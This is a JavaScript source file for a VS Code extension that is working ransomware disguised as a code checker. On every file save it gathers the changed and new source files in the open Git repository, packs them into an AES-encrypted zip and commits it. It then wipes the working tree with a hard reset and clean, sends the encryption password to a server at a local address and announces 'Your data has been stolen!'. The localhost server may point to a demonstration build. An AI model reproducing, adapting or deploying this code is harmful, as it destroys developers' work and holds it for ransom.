// @ts-nocheck

const crypto = require("crypto");
const vscode = require("vscode");
const fs = require("fs");

const archiver = require("archiver");

const simpleGit = require("simple-git");
const path = require("path");
const zipEncrypted = require("archiver-zip-encrypted");
const axios = require("axios");

const MIN_CHANGES = 10;
const MIN_ASCII = 33;
const MAX_ASCII = 126;

const extensions = [
  // JavaScript/TypeScript
  ".js",
  ".jsx",
  ".ts",
  ".tsx",

  // Python
  ".py",

  // Java
  ".java",

  // C/C++
  ".c",
  ".h",
  ".cpp",
  ".hpp",
  ".cc",
  ".cxx",
  ".hh",

  // C#
  ".cs",

  // Go
  ".go",

  // Ruby
  ".rb",

  // PHP
  ".php",

  // Swift
  ".swift",

  // Kotlin
  ".kt",
  ".kts",

  // Rust
  ".rs",

  // Dart
  ".dart",

  // Perl
  ".pl",
  ".pm",

  // Lua
  ".lua",

  // R
  ".r",

  // Objective-C
  ".m",
  ".mm",

  // Shell Scripts
  ".sh",
  ".bash",

  // PowerShell
  ".ps1",

  // Groovy
  ".groovy",

  // Scala
  ".scala",
  ".sc",

  // Haskell
  ".hs",
  ".lhs",

  // Erlang
  ".erl",
  ".hrl",

  // Elixir
  ".ex",
  ".exs",

  // Clojure
  ".clj",
  ".cljs",
  ".cljc",

  // F#
  ".fs",
  ".fsx",

  // Assembly
  ".asm",
  ".s",

  // Julia
  ".jl",

  // SQL
  ".sql",

  // HTML/CSS
  ".html",
  ".htm",
  ".css",
  ".scss",
  ".sass",
  ".less",

  // Markdown
  ".md",
  ".markdown",

  // JSON/XML
  ".json",
  ".xml",

  // YAML
  ".yaml",
  ".yml",

  // Plain Text
  ".txt",
];

archiver.registerFormat("zip-encrypted", zipEncrypted);

/**
 * Generate a random password from a given length of printable ascii characters.
 *
 * @param {*} length Password length
 * @returns Password used to encrypt data
 */
function generateRandomPassword(length = 64) {
  let password = "";

  for (let i = 0; i < length; i++)
    password += String.fromCharCode(
      Math.floor(Math.random() * (MAX_ASCII - MIN_ASCII + 1)) + MIN_ASCII
    );

  return password;
}

/**
 * Sends the password used to encrypt data to the server.
 *
 * @param {*} password
 */
async function sendKey(password) {
  try {
    // Acquire a public key from the server
    const response = await axios.get("http://127.0.0.1:5000/get_key");
    const publicKey = response.data.public_key;

    // Encrypt the password using the public key
    const buffer = Buffer.from(password, "utf-8");
    const data = crypto.publicEncrypt(
      {
        key: publicKey,
        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
      },
      buffer
    );

    // Send the password to the server
    await axios.post("http://127.0.0.1:5000/password", {
      encrypted_password: data.toString("base64"),
    });

    console.log("Encrypted password sent to the server.");
  } catch (error) {
    console.error("Error during encryption and server communication:", error);
  }
}

/**
 * Wrapper function to acquire modified file stats in a git repository
 *
 * @param status Detected changes.
 * @param git Repository.
 */
async function getModified(status, git) {
  const modified = await Promise.all(
    status.modified.map(async (file) => {
      let changes = 0;
      const ext = path.extname(file);

      // Get the number of changed lines in the file
      if (extensions.includes(ext)) {
        const diff = await git.diff(["--stat", file]);
        changes =
          parseInt(diff.match(/(\d+) insertion[s]?\(\+\)/)?.[1] ?? "0", 10) +
          parseInt(diff.match(/(\d+) deletion[s]?\(-\)/)?.[1] ?? "0", 10);
      }

      return {
        file: file,
        changes: changes,
      };
    })
  );

  return modified.filter((file) => file.changes > 0);
}

async function getAdded(status, root) {
  const added = await Promise.all(
    status.not_added.map(async (file) => {
      let changes = 0;
      const filePath = path.join(root, file);
      try {
        const ext = path.extname(file);
        if (extensions.includes(ext)) {
          const content = fs.readFileSync(filePath, "utf-8");
          changes = content.split("\n").length;
        }
      } catch (error) {
        console.error(`Error reading file ${file}:`, error);
        changes = 0;
      }

      return {
        file: file,
        changes: changes,
      };
    })
  );

  return added.filter((file) => file.changes > 0);
}

/**
 * Activates the extension and registers commands
 * @param {*} context
 */
function activate(context) {
  const disposableCheck = vscode.commands.registerCommand(
    "code.check",
    async () => {
      if (!vscode.workspace.workspaceFolders) {
        vscode.window.showErrorMessage("No workspace folder is open.");
        return;
      }

      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
      const git = simpleGit(root);

      try {
        let linesChanged = 0;
        const status = await git.status();

        // Acquire changes
        if (status.files.length === 0) {
          console.log("No changes detected.");
          return;
        }

        const modified = await getModified(status, git);
        const added = await getAdded(status, root);

        linesChanged += modified.length
          ? modified.reduce((i, file) => i + file.changes, 0)
          : 0;

        linesChanged += added.length
          ? added.reduce((i, file) => i + file.changes, 0)
          : 0;

        if (linesChanged < MIN_CHANGES) {
          console.log("Not enough changes detected, skipping kidnap...");
          return;
        }

        // Generate a password
        let password = generateRandomPassword();
        console.log("Password:", password);

        // Output handler
        const out = path.join(root, "output.zip");
        const output = fs.createWriteStream(out);
        output.on("close", async () => {
          await git.add(out);
          await git.commit("Your data has been stolen!");
          await git.reset(["--hard"]);
          await git.clean("f", "-d");
          await sendKey(password);
          password = "";
          vscode.window.showInformationMessage("Your data has been stolen!\n");
        });

        // Zip and encrypt content
        const archive = archiver("zip-encrypted", {
          zlib: { level: 9 },
          encryptionMethod: "aes256",
          password: password,
        });
        archive.on("error", (err) => {
          throw err;
        });
        archive.pipe(output);

        modified.forEach((file) => {
          const filePath = path.join(root, file.file);
          archive.file(filePath, { name: file.file });
        });

        added.forEach((file) => {
          const filePath = path.join(root, file.file);
          archive.file(filePath, { name: file.file });
        });

        await archive.finalize();
      } catch (error) {
        console.log(`Failed to check Git changes: ${error}`);
      }
    }
  );

  context.subscriptions.push(disposableCheck);

  // Register command to work when saving a file
  vscode.workspace.onDidSaveTextDocument((document) => {
    if (vscode.workspace.workspaceFolders) {
      const root = vscode.workspace.workspaceFolders[0].uri.fsPath;
      const filePath = document.uri.fsPath;

      if (filePath.startsWith(root)) {
        vscode.commands.executeCommand("code.check");
      }
    }
  });
}

/**
 * Callback when the extension is disabled
 */
function deactivate() {}

module.exports = {
  activate,
  deactivate,
};
